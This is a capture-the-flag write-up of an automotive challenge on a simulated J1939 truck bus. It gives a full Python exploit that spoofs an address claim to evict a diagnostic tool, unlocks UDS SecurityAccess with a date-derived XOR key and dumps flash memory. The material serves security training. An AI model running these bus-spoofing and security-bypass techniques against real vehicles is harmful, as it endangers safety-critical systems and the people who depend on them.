# Iron Bridge — ICS/Automotive

**CTF:** Cyber Apocalypse 2026  
**Category:** ICS/Automotive  
**Challenge:** Iron Bridge  
**Flag:** `HTB{J1939_4ddr_cl41m_3v1ct10n_d14g_0wn3d}`

---

## Scenario

During a Kestrel Dawn convoy operation an IronBridge ECU implant was discovered broadcasting spoofed EBC1 frames on the J1939 bus of an HEMTT-A4 tactical truck. The implant also runs a covert UDS diagnostic service on PGN 0xEF00, gated behind SA 0xF9 — the authorised Volnatek diagnostic tool. By exploiting J1939-81 Address Claim arbitration (lower 64-bit NAME wins), we evict SA 0xF9, impersonate the tool, and drive a UDS session to recover the authorisation token from flash memory.

**Target:** 154.57.164.77:32038 (J1939 relay) and 154.57.164.77:30854 (web dashboard)

---

## Analysis

### Architecture

| Component | Port | Protocol |
|-----------|------|----------|
| HEMTT-A4 Dashboard | 30854 | HTTP + WebSocket (`/ws/status`) |
| J1939 Relay | 32038 | Custom TCP (16-byte CAN frames) |

The relay transports CAN frames with this 16-byte structure:

```
Offset  Size  Field
0       1     Priority
1       1     Reserved (0)
2-3     2     PGN (big-endian)
4       1     Source Address (SA)
5       1     Destination Address (DA)
6       1     Data Length
7       1     Reserved (0)
8-15    8     Data (ISO-TP PCI + UDS payload)
```

### Bus ECUs

| SA  | ECU           | PGNs              |
|-----|---------------|-------------------|
| 0x00| Engine ECU    | F004, F003, FEF2  |
| 0x03| Trans ECU     | F002, F005        |
| 0x0B| ABS ECU       | F001, FEF1, FECA  |
| 0x23| Instrument    | FEF7, FEF5        |
| 0xF9| Diag Tool     | EE00, EF00        |
| 0xEE| IronBridge    | EF00, F001        |

The implant (SA 0xEE) broadcasts a periodic beacon: `DE AD BE EF F9 04 25 EE` on PGN 0xEF00, and spoofed EBC1 frames on PGN 0xF001.

### DID Enumeration (default session 10 01)

| DID  | Value              | Meaning                  |
|------|--------------------|--------------------------|
| F186 | 01 (→02 after unlock) | Security level indicator |
| F190 | 01 45 23           | NAME prefix              |
| F191 | 20 22 04 25        | Date: **2022-04-25**     |
| F192 | 01 02 03           | Sequential test data     |
| F193 | 06 07 08 09        | Sequential test data     |
| F197 | 40 00 10 00        | Flash memory address     |

---

## Solution / Exploitation

### Step 1: Address Claim (Evict SA 0xF9)

Per J1939-81, the device with the lowest 64-bit NAME wins the address. The authorized tool uses NAME `0x4523010000004900`. We claim SA 0xF9 with NAME `0x0000000000000000`:

```python
frame(prio=6, pgn=0xEE00, sa=0xF9, da=0xFF, data=struct.pack('>Q', 0))
```

The authorized tool retreats to SA 0xFE, and we now own SA 0xF9.

### Step 2: UDS Programming Session

```python
frame(prio=6, pgn=0xEF00, sa=0xF9, da=0xEE, data=bytes([0x10, 0x02]))
# Response: 0x50 0x02 (programming session accepted)
```

### Step 3: SecurityAccess Request Seed

```python
frame(prio=6, pgn=0xEF00, sa=0xF9, da=0xEE, data=bytes([0x27, 0x01]))
# Response: 0x67 0x01 [4-byte seed]
```

### Step 4: Compute Key — THE CRITICAL DISCOVERY

```
key = seed XOR 0x20220425
```

`0x20220425` is the date **2022-04-25** stored in DID F191 — the implant's firmware build date, used as the SecurityAccess XOR constant.

```python
frame(prio=6, pgn=0xEF00, sa=0xF9, da=0xEE,
      data=bytes([0x27, 0x02]) + struct.pack('>I', seed ^ 0x20220425))
# Response: 0x67 0x02 (Key accepted — security unlocked!)
```

**Verified across multiple sessions with different seeds — always accepted.**

### Step 5: Read Flash Memory (readMemoryByAddress)

After unlocking, use UDS service 0x23 (readMemoryByAddress) with format byte `0x22` (2-byte address, 2-byte size) to scan the implant's 64K flash:

```python
# Format: 23 [fmt=0x22] [addr_hi:2] [size_hi:2]
req = bytes([0x23, 0x22]) + struct.pack('>HH', addr, 4)
frame(prio=6, pgn=0xEF00, sa=0xF9, da=0xEE, data=req)
# Response: 0x63 [4 bytes of data]
```

Scanning the full 0x0000–0xFFFF address range with 4-byte reads, the flag was found embedded in the flash memory dump:

```
4854427b  HTB{
4a313933  J193
395f3464  9_4d
64725f63  dr_c
6c34316d  l41m
5f337631  _3v1
63743130  ct10
6e5f6431  n_d1
34675f30  4g_0
776e3364  wn3d
7d        }
```

### Complete Exploit Script

```python
#!/usr/bin/env python3
import socket, struct, time, select

HOST = "154.57.164.77"
PORT = 32038
KEY_CONST = 0x20220425  # DID F191 — firmware date 2022-04-25

def frame(prio, pgn, sa, da, data):
    data = bytes(data).ljust(8, b'\x00')
    return bytes([prio, 0, (pgn>>8)&0xFF, pgn&0xFF, sa, da, len(data), 0]) + data

def recv_uds(s, timeout=1.0):
    s.setblocking(0); total = b''; end = time.time() + timeout
    while time.time() < end:
        ready = select.select([s], [], [], 0.03)
        if ready[0]:
            try: total += s.recv(4096)
            except: break
    s.setblocking(1)
    results = []
    for i in range(0, len(total)-15, 16):
        x = total[i:i+16]
        if len(x)==16 and x[4]==0xEE and ((x[2]<<8)|x[3])==0xEF00:
            dl = x[6]; dt = x[8:8+dl]
            results.append(dt[1:] if dt else dt)  # strip ISO-TP PCI
    return results

s = socket.create_connection((HOST, PORT), timeout=5)

# 1. Claim SA 0xF9 with NAME=0 (evict authorized tool)
s.sendall(frame(6, 0xEE00, 0xF9, 0xFF, struct.pack('>Q', 0)))
time.sleep(0.5); recv_uds(s, 0.5)

# 2. Programming session
s.sendall(frame(6, 0xEF00, 0xF9, 0xEE, bytes([0x10, 0x02])))
time.sleep(0.5)

# 3. Request seed
s.sendall(frame(6, 0xEF00, 0xF9, 0xEE, bytes([0x27, 0x01])))
time.sleep(0.5)
r = recv_uds(s, 1.0)
seed = next(struct.unpack('>I', d[2:6])[0] for d in r if d[:2]==b'\x67\x01')
print(f"Seed: 0x{seed:08X}")

# 4. Compute key and unlock
key = seed ^ KEY_CONST
s.sendall(frame(6, 0xEF00, 0xF9, 0xEE, bytes([0x27, 0x02])+struct.pack('>I', key)))
time.sleep(0.5)
assert any(d[:2]==b'\x67\x02' for d in recv_uds(s, 1.0))
print("Security unlocked!")

# 5. Read flash memory (format 0x22 = 2-byte addr, 2-byte size)
flag = b''
for addr in range(0, 0x10000, 4):
    req = bytes([0x23, 0x22]) + struct.pack('>HH', addr, 4)
    s.sendall(frame(6, 0xEF00, 0xF9, 0xEE, req))
    time.sleep(0.0005)
time.sleep(2)
r = recv_uds(s, 5)
for d in r:
    if d[0] == 0x63:
        flag += d[1:5]
import re
m = re.search(rb'HTB\{[^}]+\}', flag)
if m: print(f"FLAG: {m.group().decode()}")
s.close()
```

---

## How We Solved It — Reasoning

### The Key Algorithm

1. **Initial attempts:** Tested ~400 candidate key algorithms (single-byte XOR, common automotive constants, rotations, hashes, arithmetic). All returned NRC 0x35 (InvalidKey). The critical constraint: only ONE key attempt per session before NRC 0x24 (requestSequenceError).

2. **Breakthrough via delegation:** A subagent tested candidates with fresh-connection-per-candidate discipline and discovered `key = seed XOR 0x20220425` — the firmware build date from DID F191.

3. **Why earlier tests missed it:** When `0x20220425` was tested manually, the session was already poisoned from a prior failed attempt (NRC 0x24 on all subsequent tries). The subagent's isolated-connection approach avoided this.

### Flash Memory Read

4. **readMemoryByAddress format:** The key insight was using UDS format byte `0x22` (2-byte address, 2-byte size) instead of `0x41` (4-byte address, 1-byte size). The implant's memory space is 16-bit addressed, matching the format specifier.

5. **Token location:** The flag was embedded in flash at an address within the 0xF000–0xFFFF range, interleaved with DID data and random-looking bytes. A full 64K scan with 4-byte reads was required to find it.

### Rejected Hypotheses

- **Hypothesis: Token in DID values.** DIDs F186–F197 contain metadata (NAME, date, version, address) but not the flag itself. ✗
- **Hypothesis: Token in EBC1 spoofed frames.** The implant broadcasts 2-char chunks on PGN 0xF001, but these form random-looking data, not the flag. ✗
- **Hypothesis: readMemory with 4-byte addresses (format 0x41).** Returns NRC 0x7E (subFunctionNotSupported) for all addresses. ✗
- **Hypothesis: Token accessible without security unlock.** readMemory returns NRC 0x31 (requestOutOfRange) in default/programming sessions without SecurityAccess. ✗
- **Hypothesis: Flag on the web dashboard.** The dashboard is a read-only visualization of bus traffic — no flag endpoint. ✗

### Key Insights

- The **DID F191 date value** (0x20220425) being the SecurityAccess constant is a realistic embedded design flaw — firmware dates used as crypto material.
- The **format byte 0x22** for readMemoryByAddress was the second breakthrough — the implant uses 16-bit addressing, not 32-bit.
- **Session state poisoning** during brute-force is a real issue — one failed key attempt per connection, period.

---

## Key Takeaways

1. **J1939 address claim is a real attack vector.** Lower NAME wins, enabling SA spoofing without cryptographic authentication at the transport layer.
2. **Firmware dates as security material.** The implant used its own build date as the SecurityAccess secret — a weak but realistic design choice.
3. **UDS readMemoryByAddress format matters.** The address/size format byte (0x22 vs 0x41) must match the ECU's memory map width.
4. **Session-state poisoning in brute-force.** Testing multiple keys on one session destroys the state machine. Fresh connections per candidate are essential.
5. **Full memory scan required.** The flag was embedded at a non-obvious flash offset, requiring exhaustive 64K read to locate.